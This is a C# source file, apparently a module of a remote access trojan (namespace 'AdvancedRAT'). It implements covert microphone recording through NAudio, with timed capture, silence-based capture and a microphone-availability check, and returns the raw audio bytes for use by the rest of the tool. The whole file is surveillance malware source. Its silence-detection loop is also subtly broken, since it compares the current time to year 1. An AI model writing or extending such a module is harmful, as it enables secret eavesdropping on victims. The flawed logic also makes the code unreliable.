using System;
using System.IO;
using System.Media;
using System.Threading.Tasks;
using NAudio.Wave;

namespace AdvancedRAT.Core.Modules
{
    public class MicrophoneRecorder
    {
        private static WaveInEvent waveIn;
        private static MemoryStream recordedData;
        private static bool isRecording = false;

        public static async Task<byte[]> RecordAudio(int durationSeconds)
        {
            return await Task.Run(() =>
            {
                try
                {
                    recordedData = new MemoryStream();
                    waveIn = new WaveInEvent
                    {
                        DeviceNumber = 0, // Default microphone
                        WaveFormat = new WaveFormat(44100, 16, 1) // 44.1kHz, 16-bit, mono
                    };

                    waveIn.DataAvailable += (sender, e) =>
                    {
                        if (isRecording)
                        {
                            recordedData.Write(e.Buffer, 0, e.BytesRecorded);
                        }
                    };

                    waveIn.RecordingStopped += (sender, e) =>
                    {
                        waveIn.Dispose();
                        isRecording = false;
                    };

                    isRecording = true;
                    waveIn.StartRecording();

                    // Record for specified duration
                    System.Threading.Thread.Sleep(durationSeconds * 1000);

                    waveIn.StopRecording();
                    
                    byte[] audioData = recordedData.ToArray();
                    recordedData.Dispose();
                    
                    return audioData;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Microphone recording failed: {ex.Message}");
                    return new byte[0];
                }
            });
        }

        public static async Task<byte[]> RecordUntilSilence(int maxDurationSeconds, int silenceThreshold = 2000)
        {
            return await Task.Run(() =>
            {
                try
                {
                    recordedData = new MemoryStream();
                    waveIn = new WaveInEvent
                    {
                        DeviceNumber = 0, // Default microphone
                        WaveFormat = new WaveFormat(44100, 16, 1) // 44.1kHz, 16-bit, mono
                    };

                    DateTime lastSoundDetected = DateTime.Now;
                    isRecording = true;

                    waveIn.DataAvailable += (sender, e) =>
                    {
                        if (isRecording)
                        {
                            // Write to memory stream
                            recordedData.Write(e.Buffer, 0, e.BytesRecorded);

                            // Check for sound level to detect silence
                            if (DetectSoundLevel(e.Buffer, e.BytesRecorded) > silenceThreshold)
                            {
                                lastSoundDetected = DateTime.Now;
                            }
                        }
                    };

                    waveIn.RecordingStopped += (sender, e) =>
                    {
                        waveIn.Dispose();
                        isRecording = false;
                    };

                    waveIn.StartRecording();

                    // Continue until max duration or silence period
                    while ((DateTime.Now - lastSoundDetected).TotalSeconds < 2 && 
                           (DateTime.Now - new DateTime()).TotalSeconds < maxDurationSeconds)
                    {
                        System.Threading.Thread.Sleep(100);
                    }

                    waveIn.StopRecording();
                    
                    byte[] audioData = recordedData.ToArray();
                    recordedData.Dispose();
                    
                    return audioData;
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Microphone recording with silence detection failed: {ex.Message}");
                    return new byte[0];
                }
            });
        }

        private static int DetectSoundLevel(byte[] buffer, int bytesRecorded)
        {
            int sum = 0;
            for (int i = 0; i < bytesRecorded; i += 2) // 16-bit samples
            {
                short sample = (short)(buffer[i] | (buffer[i + 1] << 8));
                sum += Math.Abs(sample);
            }
            return sum / (bytesRecorded / 2);
        }

        public static async Task<bool> IsMicrophoneAvailable()
        {
            try
            {
                int waveInDevices = WaveIn.DeviceCount;
                return waveInDevices > 0;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Microphone availability check failed: {ex.Message}");
                return false;
            }
        }
    }
}